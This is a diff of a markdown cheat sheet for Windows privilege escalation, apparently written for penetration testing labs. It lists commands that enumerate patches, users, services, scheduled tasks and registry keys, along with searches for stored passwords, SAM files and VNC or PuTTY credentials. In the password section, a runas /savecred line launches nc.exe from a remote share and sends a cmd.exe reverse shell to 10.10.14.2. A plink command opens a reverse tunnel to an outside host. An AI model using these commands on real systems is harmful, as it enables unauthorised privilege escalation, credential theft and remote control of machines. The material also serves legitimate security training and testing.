@@ -1,53 +1,57 @@
 
 # Windows Privilege Escalation
 
-### patch level  
+### Check OS, Patch level, Basic 
+````
 systeminfo  
 wmic qfe get Caption,Description,HotFixID,InstalledOn  
 
 whoami  
 echo %USERNAME%  
 
+Whoami /priv
+whoami /groups 
+
 net user  
 net localgroup  
-
-users in a domain  
 net user /domain  
-
 net group /domain  
 net group /domain <Group Name>  
-
+````
 ### Firewall  
+````
 netsh firewall show state  
 netsh firewall show config  
+````
 
 ### Network  
+````
 ipconfig /all  
 route print  
 arp -A  
+````
 
 ### Scheduled Tasks  
-schtasks /query /fo LIST /v  
---copy output and save in txt  
-cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM  
+````
+schtasks /query /fo LIST /v  # Copy to schtasks.txt on local and run -> cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM  
 
 dir %SystemRoot%\Tasks  
 
 e.g. c:\windows\tasks\  
 e.g. c:\windows\system32\tasks\  
+````
+### Service Permissions  
+Check if service config can be modified  
 
-### Weak Service Permissions  
-Check service config can be modify or not  
-
+````
 accesschk.exe /accepteula  
 accesschk.exe -uwcqv "Authenticated Users" * /accepteula  
 accesschk.exe -ucqv \<Service Name>  
 
-sc qc \<Service Name> -- Get service details  
-
+sc qc \<Service Name>  #  Get service details  
+````
 Check service with weak file permission  
-User c:\windows\temp\  
-
+````
 wmic.exe  
 for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
 for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"  
@@ -58,29 +62,34 @@ FOR /F %i in (Servicenames.txt) DO echo %i
 type Servicenames.txt  
 FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt  
 FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt  
+````
 
 ### Unquoted Service Path  
+````
 wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """  
 
 sc query  
 sc qc service name  
-
+````
 ### AlwaysInstallElevated << IF 64 bits use:  %SystemRoot%\Sysnative\reg.exe  
+````
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated  
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated  
-
+````
 ### Service only available from inside  
+````
 netstat -ano  
 upload plink.exe  
-
 plink.exe -R "remote port":127.0.0.1:"local port"  root@"ipaddress"
-
+````
 ### Pasword in files  
+````
 https://pentestlab.blog/tag/privilege-escalation/page/3/  
 cmdkey /list        << If there are entries, it means that we may able to runas certain user who stored his cred in windows  
 runas /savecred /user:ACCESS\Administrator "c:\windows\system32\cmd.exe /c \\IP\share\nc.exe -nv 10.10.14.2 80 -e cmd.exe"  
-
+````
 Can we find any SAM files?  
+````
 %SYSTEMROOT%\repair\SAM  
 %SYSTEMROOT%\System32\config\RegBack\SAM  
 %SYSTEMROOT%\System32\config\SAM  
@@ -98,8 +107,9 @@ dir /s *pass* == *cred* == *vnc* == *.config*
 in all files  
 findstr /spin "password" *.*  
 findstr /spin "password" *.*  
-
-Unattended? vnc?  
+````
+#### Unattended config 
+````
 c:\sysprep.inf  
 c:\sysprep\sysprep.xml  
 c:\unattend.xml  
@@ -115,8 +125,10 @@ dir /b /s *pass*
 dir c:\*vnc.ini /s /b  
 dir c:\*ultravnc.ini /s /b   
 dir c:\ /s /b | findstr /si *vnc.ini  
-
-### VNC  
+````
+### Registry   
+````
+### VNC
 reg query "HKCU\Software\ORL\WinVNC3\Password"  
 reg query "HKCU\Software\TightVNC\Server"  
 
@@ -134,11 +146,7 @@ reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
 reg query HKLM /f password /t REG_SZ /s  
 reg query HKCU /f password /t REG_SZ /s  
 
-
-
-
-
-
+````
 
 
 
